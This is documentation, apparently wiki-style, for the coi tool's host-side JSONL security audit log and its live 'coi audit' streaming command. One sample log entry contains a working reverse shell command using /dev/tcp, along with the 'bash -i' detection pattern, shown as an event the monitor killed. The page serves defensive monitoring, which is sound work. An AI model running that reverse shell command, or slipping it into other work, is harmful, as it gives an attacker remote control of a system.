# Audit Log

Coi records security events to a structured, host-side audit log (JSON Lines), and exposes them live with the `coi audit` command. The log is the forensic record of what the security monitor saw during a session — it lives on the host, persists after the container is gone, and is queryable with standard tools (`jq`, `grep`).

For the detection engine that produces these events (threat levels, automated pause/kill, nftables monitoring), see [Security Monitoring](Security-Monitoring).

## On-Disk Audit Logs

All security events are logged to `~/.coi/audit/<container-name>.jsonl`:

```json
{"id":"6f3f9db2-4c7a-4a1e-9b8e-2d1c0a5e7f41","timestamp":"2026-02-18T10:23:45.123456789Z","level":"critical","category":"process","title":"Reverse shell detected","description":"Process 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' (PID 4321) matches reverse shell pattern 'bash -i'","evidence":{"process":{"pid":4321,"command":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","user":"code","pattern":"bash -i","indicators":["bash -i"]}},"action":"killed"}
{"id":"2c8e1a44-0d5b-4f7c-a3e9-8b6f2d190c57","timestamp":"2026-02-18T10:24:01.005432100Z","level":"high","category":"filesystem","title":"Large workspace write detected","description":"Write 100.00 MB at 25.00 MB/sec (threshold: 50.00 MB)","evidence":{"file_write":{"write_bytes_mb":100,"write_rate_mb_per_sec":25,"threshold_mb":50,"duration":"4s"}},"action":"paused"}
{"id":"9b1d7e02-5a3c-4c8f-b6d4-0e2a8c471f36","timestamp":"2026-02-18T10:25:30.892017400Z","level":"high","category":"network","title":"Unexpected network connection","description":"Connection to 192.168.1.100:22: private network address","evidence":{"network":{"connection":{"protocol":"tcp","local_addr":"10.47.62.5:51234","remote_addr":"192.168.1.100:22","state":"ESTABLISHED","suspicious":true,"suspect_reason":"private network address"},"reason":"private network address","remote_host":"192.168.1.100"}},"action":"alerted"}
```

Network events from nftables are logged separately to `~/.coi/audit/<container-name>-nft.jsonl`.

### Audit Log Field Reference

Every JSONL threat event contains these fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | string | Unique event ID (UUID) |
| `timestamp` | string | RFC 3339 UTC timestamp of the event |
| `level` | string | Threat level: `info`, `warning`, `high`, or `critical` |
| `category` | string | Event category: `process`, `network`, `filesystem`, `environment`, `auth`, `proc_event`, or a sensitive-file category such as `credential_access` / `persistence` |
| `title` | string | Short summary, e.g. `Reverse shell detected` |
| `description` | string | Detailed explanation (command, PID, byte counts, destination, ...) |
| `action` | string | Response taken: `logged`, `alerted`, `paused`, `killed`, or `deduplicated` (repeat of a recently alerted threat) |
| `evidence` | object | Nested, threat-specific supporting data — exactly one sub-object is set per event |

Evidence sub-objects (typed per threat kind, serialized with `omitempty`):

| Evidence key | Emitted for | Example fields |
|-------|-------------|-------------|
| `evidence.process` | Suspicious processes and environment scanning | `pid`, `command`, `pattern`, `indicators` |
| `evidence.network` | Unexpected network connections | `connection` (with `protocol`, `local_addr`, `remote_addr`, `state`), `reason`, `remote_host` |
| `evidence.filesystem` | Large workspace reads | `read_bytes_mb`, `read_rate_mb_per_sec`, `threshold_mb` |
| `evidence.file_write` | Large workspace writes | `write_bytes_mb`, `write_rate_mb_per_sec`, `threshold_mb` |
| `evidence.sensitive_file` | Sensitive-file access (fanotify) | `path`, `access`, `pid` |
| `evidence.process_count` | Fork-bomb / spawn-rate spikes | `count`, `threshold`, `delta` |
| `evidence.auth_log` | auth.log / syslog pattern matches | `log_file`, `line`, `pattern` |
| `evidence.proc_event` | Netlink PROC_EVENTS detections | `pid`, `command`, `pattern` |

NFT network events (written to `<container-name>-nft.jsonl`) additionally include:

| Field | Description |
|-------|-------------|
| `src` | Source IP:port inside the container |
| `rule` | The nftables rule that matched |
| `iif` | Inbound interface |
| `oif` | Outbound interface |

View audit logs:

```bash
# Real-time monitoring dashboard (auto-detects container from current workspace)
coi monitor

# Or specify a container explicitly
coi monitor coi-abc123-1

# Specify workspace path for auto-detection
coi monitor --workspace /path/to/project

# Review historical events
cat ~/.coi/audit/coi-abc123-1.jsonl

# Filter by severity
cat ~/.coi/audit/coi-abc123-1.jsonl | grep '"level":"high"'
cat ~/.coi/audit/coi-abc123-1.jsonl | grep '"level":"critical"'
```

## `coi audit` — Live Threat-Event Streaming

`coi audit` exposes the audit stream as JSON Lines on stdout, ready to pipe into a SIEM, `jq`, or a flat file.

### Basic Usage

```bash
# Dump the host-side audit log for the container in the current workspace
coi audit

# Dump the host-side audit log for a specific container
coi audit coi-abc123-1

# Stream live events from the running container (in-container collector)
coi audit coi-abc123-1 --follow

# Re-stream a saved recording from a custom path
coi audit --file ./session.jsonl
```

### Two Operating Modes

**Dump mode** (default, no `--follow`): reads `~/.coi/audit/<container>.jsonl` written by the security monitoring daemon and prints it to stdout. Use this to review historical events after a session ends.

**Follow mode** (`--follow`): pushes a small POSIX-sh collector into the running container via `incus exec` and streams live events as they happen. No daemon is installed — the collector exits when `coi audit` is interrupted. Requires the container to be running.

### Event Format

All events are JSON Lines (one object per line). The `type` field identifies the event source:

| `type` | Source | Key fields |
|--------|--------|------------|
| `exec` | `ps` diff every 2 s | `pid`, `ppid`, `comm`, `args` |
| `net` | `ss -tunp` diff every 5 s | `proto`, `state`, `local`, `peer`, `pid`, `comm` |
| `file` | auditd `PATH` records | `path`, `op`, `pid`, `comm` |
| `audit` | auditd / syslog / auth.log | `msg`, `raw` |
| `heartbeat` | Emitted every 10 s | `seq`, `sources` |

Every event also carries:

| Field | Description |
|-------|-------------|
| `ts` | ISO 8601 UTC timestamp with millisecond precision |
| `sessionId` | Container name (set by the host-side collector) |
| `container` | Container name |

Fields are sparse-populated with `omitempty` — only relevant fields appear for each event type.

**Example output:**

```jsonl
{"ts":"2026-05-05T14:30:11.123Z","sessionId":"coi-abc123-1","container":"coi-abc123-1","type":"exec","pid":1234,"ppid":1,"comm":"curl","args":"curl https://example.com"}
{"ts":"2026-05-05T14:30:12.005Z","sessionId":"coi-abc123-1","container":"coi-abc123-1","type":"net","proto":"tcp","state":"ESTAB","local":"10.47.62.5:54321","peer":"93.184.216.34:443","comm":"curl"}
{"ts":"2026-05-05T14:30:20.000Z","sessionId":"coi-abc123-1","container":"coi-abc123-1","type":"heartbeat","seq":1,"sources":"ss ps"}
```

### Event Sources (In Priority Order)

When `--follow` is active, the in-container collector tries sources in order:

1. **auditd** — tails `/var/log/audit/audit.log` if auditd is running; `PATH` records → `type=file`, `EXECVE`/`SYSCALL` records → `type=audit`
2. **syslog / auth.log** — fallback when auditd is absent; all lines become `type=audit` events
3. **`ss` snapshots** — `ss -tunp` every 5 s; only new connections (diff against previous snapshot) become `type=net` events
4. **`ps` snapshots** — `ps` every 2 s; only new PIDs (diff) become `type=exec` events
5. **heartbeat** — a `type=heartbeat` event every 10 s so the host can detect if the agent dies

The `sources` field of each heartbeat lists which sources are active (e.g. `"ss ps"` when auditd is absent).

### Heartbeat Liveness Detection

The host-side watcher monitors agent liveness:

- **Stale threshold**: 35 s (≈3 missed heartbeats + 5 s grace)
- When stale: a warning is printed to stderr and a synthetic `type=audit msg=agent.stale` event is injected into the stream so downstream consumers see it
- When recovered: an `msg=agent.alive` event is emitted

```text
[audit] WARNING agent silent on coi-abc123-1 for 36s (last heartbeat 2026-05-05T12:34:46Z)
[audit] agent recovered on coi-abc123-1 after 36s of silence
```

### Filtering and Piping

```bash
# Show only network connections
coi audit coi-abc123-1 --follow | jq -c 'select(.type=="net")'

# Show only new processes
coi audit coi-abc123-1 --follow | jq -c 'select(.type=="exec")'

# Save a full session recording
coi audit coi-abc123-1 --follow > ~/recordings/session-$(date +%Y%m%d).jsonl

# Replay a saved recording
coi audit --file ~/recordings/session-20260505.jsonl | jq '.type' | sort | uniq -c

# Count events by type from a live session
coi audit coi-abc123-1 --follow | jq -r '.type' | sort | uniq -c
```

### Tuning the In-Container Agent

The collector script reads these environment variables:

| Variable | Default | Effect |
|----------|---------|--------|
| `COI_AUDIT_NET_INTERVAL` | `5` | Seconds between `ss` snapshots |
| `COI_AUDIT_PROC_INTERVAL` | `2` | Seconds between `ps` snapshots |
| `COI_AUDIT_HEARTBEAT_INTERVAL` | `10` | Seconds between heartbeat events |

The collector runs inside the container (it is launched via `incus exec`, which does not forward the host environment), so setting these variables on the host before running `coi audit` has no effect. They must be present in the container's exec environment, e.g. via Incus instance config:

```bash
# Higher-resolution process tracking (1 s intervals)
# (add --project <name> if you changed [incus] project from its "default")
incus config set coi-abc123-1 environment.COI_AUDIT_PROC_INTERVAL=1
coi audit coi-abc123-1 --follow
```

Coi's own env plumbing (`[defaults] environment` / `forward_env`) applies to the AI-tool session it launches, not to the separate `incus exec` that runs the audit collector.

### Resource Overhead

The in-container collector has negligible overhead: ~4.5 MB RSS and ~0.0% CPU when idle. No eBPF, no daemon install, no new Go dependencies. The collector only runs while `coi audit --follow` is active and terminates immediately on Ctrl+C.

## See Also

- [Security Monitoring](Security-Monitoring) — the detection engine that produces these events (threat levels, automated response, nftables monitoring)
- [Session Logs](Session-Logs) — Coi's own operational logs (`coi logs`), distinct from security audit events
- [Architecture and Security Model](Architecture-and-Security-Model) — where audit logging fits in the defense layers
